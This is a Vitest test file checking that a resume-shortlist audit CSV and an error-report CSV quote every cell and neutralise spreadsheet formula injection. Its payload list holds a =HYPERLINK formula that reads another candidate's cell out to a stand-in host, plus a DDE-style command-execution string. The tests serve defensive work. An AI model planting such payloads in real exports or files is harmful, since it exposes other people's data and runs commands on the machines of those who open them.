/**
 * A STRANGER'S TEXT IN AN EXPORT OPENS AS TEXT, NOT A FORMULA (S13-085, S13-091).
 *
 * WHAT WAS WRONG.
 *   S13-085  Shortlist's audit CSV quoted each cell and nothing more. The
 *            candidate names the file, and the resume can steer the model's
 *            flags and level read, so a cell could begin with "=": Excel,
 *            Sheets and LibreOffice strip the quotes and evaluate it, and
 *            =HYPERLINK(...&C3...) reads other candidates' cells out.
 *   S13-091  The owner's /errors CSV wrote type, code and function name raw
 *            and joined with commas. Those come from log_error_telemetry,
 *            which any visitor may call: a comma moved every later column,
 *            and "=HYPERLINK(...)" ran when the owner opened the file.
 *
 * WHAT HOLDS NOW: every cell of both exports is quoted, quotes doubled, and a
 * cell whose first character is a formula lead (equals, plus, minus, at, tab,
 * carriage return) starts with an apostrophe. Read back with a CSV parser,
 * each row has exactly as many fields as the header, and no field begins with
 * a formula lead.
 */
import { describe, expect, it, vi } from "vitest";

vi.mock("@/integrations/supabase/client", () => ({ supabase: { from: () => ({}), functions: { invoke: async () => ({ data: null, error: null }) }, auth: {} } }));
vi.mock("@/contexts/AuthContext", () => ({ useAuth: () => ({ session: null, user: null, loading: false }) }));

import { csvCell, FORMULA_LEADS } from "@/lib/spreadsheet-safe-csv";
import { SHORTLIST_AUDIT_COLUMNS, shortlistAuditCsv } from "@/pages/Shortlist";
import { ERROR_REPORT_COLUMNS, errorReportCsv, type ErrorTelemetry } from "@/pages/ErrorDashboard";

/** RFC 4180 fields of a document, quotes honoured (a comma or newline inside quotes stays in its field). */
function parseCsv(doc: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  for (let i = 0; i < doc.length; i++) {
    const c = doc[i];
    if (quoted) {
      if (c === '"' && doc[i + 1] === '"') { field += '"'; i++; }
      else if (c === '"') quoted = false;
      else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ",") { row.push(field); field = ""; }
    else if (c === "\n") { row.push(field); rows.push(row); row = []; field = ""; }
    else field += c;
  }
  row.push(field);
  rows.push(row);
  return rows;
}

const PAYLOADS = [
  '=HYPERLINK("https://x.example/?d="&C3,"open")',
  "+cmd|' /C calc'!A0",
  "-2+3",
  "@SUM(1+1)",
  "\t=1+1",
  "\r=1+1",
];
const startsWithFormula = (s: string) => s.length > 0 && FORMULA_LEADS.includes(s[0]);

describe("one cell", () => {
  it("every formula lead becomes text, and the rest of the value is kept", () => {
    for (const p of PAYLOADS) {
      const [[cell]] = parseCsv(csvCell(p));
      expect(startsWithFormula(cell), JSON.stringify(cell)).toBe(false);
      expect(cell).toBe(`'${p}`);
    }
  });

  it("an ordinary value is only quoted", () => {
    expect(csvCell("Senior engineer")).toBe('"Senior engineer"');
    expect(csvCell(87)).toBe('"87"');
    expect(csvCell(null)).toBe('""');
    expect(csvCell('say "hi", then go')).toBe('"say ""hi"", then go"');
  });
});

describe("S13-085: the Shortlist audit CSV", () => {
  const doc = shortlistAuditCsv([
    {
      id: "cand-1", file_name: PAYLOADS[0], score: 71, level_read: PAYLOADS[1], status: "pending",
      flags: [PAYLOADS[3], "JD requires Kafka, not present"], model_version: "m", jd_version: 2, created_at: "2026-11-03T10:00:00Z",
    },
    {
      id: "cand-2", file_name: "jane-doe.pdf", score: 64, level_read: "Senior", status: "advanced",
      flags: [], model_version: "m", jd_version: 2, created_at: "2026-11-03T10:05:00Z",
    },
  ], { "cand-2": { overrideScore: 80, altReview: false } });
  const rows = parseCsv(doc);

  it("has the header and one row per candidate, each exactly as wide as the header", () => {
    expect(rows[0]).toEqual([...SHORTLIST_AUDIT_COLUMNS]);
    expect(rows).toHaveLength(3);
    for (const r of rows) expect(r).toHaveLength(SHORTLIST_AUDIT_COLUMNS.length);
  });

  it("no cell a candidate or the model wrote can run as a formula", () => {
    for (const r of rows.slice(1)) for (const cell of r) expect(startsWithFormula(cell), JSON.stringify(cell)).toBe(false);
    const [, first] = rows;
    expect(first[SHORTLIST_AUDIT_COLUMNS.indexOf("file_name")]).toBe(`'${PAYLOADS[0]}`);
    expect(first[SHORTLIST_AUDIT_COLUMNS.indexOf("level_read")]).toBe(`'${PAYLOADS[1]}`);
    expect(first[SHORTLIST_AUDIT_COLUMNS.indexOf("flags")]).toBe(`'${PAYLOADS[3]}; JD requires Kafka, not present`);
  });

  it("the ordinary row is unchanged apart from its quotes", () => {
    expect(rows[2]).toEqual(["cand-2", "jane-doe.pdf", "64", "80", "no", "Senior", "advanced", "", "m", "2", "2026-11-03T10:05:00Z"]);
  });
});

describe("S13-091: the owner's /errors CSV", () => {
  const row = (over: Partial<ErrorTelemetry>): ErrorTelemetry => ({
    id: "e1", error_type: "client", error_code: "E1", error_message: null, created_at: "2026-11-03T10:00:00Z",
    visitor_id: null, function_name: null, http_status: 400, context: null, ...over,
  });
  const doc = errorReportCsv([
    row({ error_code: '=HYPERLINK("https://x.example","open")', error_type: "+x", function_name: "a,b,c", error_message: "=1+2" }),
    row({ error_code: "upload_failed", error_type: "api", function_name: "parse-pdf", error_message: 'He said "no", twice\nthen left', http_status: 502 }),
  ]);
  const rows = parseCsv(doc);

  it("a value with commas or a line break stays in its own column", () => {
    expect(rows[0]).toEqual([...ERROR_REPORT_COLUMNS]);
    expect(rows).toHaveLength(3);
    for (const r of rows) expect(r).toHaveLength(ERROR_REPORT_COLUMNS.length);
    expect(rows[1][ERROR_REPORT_COLUMNS.indexOf("Function")]).toBe("a,b,c");
    expect(rows[2][ERROR_REPORT_COLUMNS.indexOf("Message")]).toBe('He said "no", twice\nthen left');
  });

  it("no cell a stranger wrote can run as a formula", () => {
    for (const r of rows.slice(1)) for (const cell of r) expect(startsWithFormula(cell), JSON.stringify(cell)).toBe(false);
    expect(rows[1][ERROR_REPORT_COLUMNS.indexOf("Code")]).toBe(`'=HYPERLINK("https://x.example","open")`);
    expect(rows[1][ERROR_REPORT_COLUMNS.indexOf("Message")]).toBe("'=1+2");
  });
});
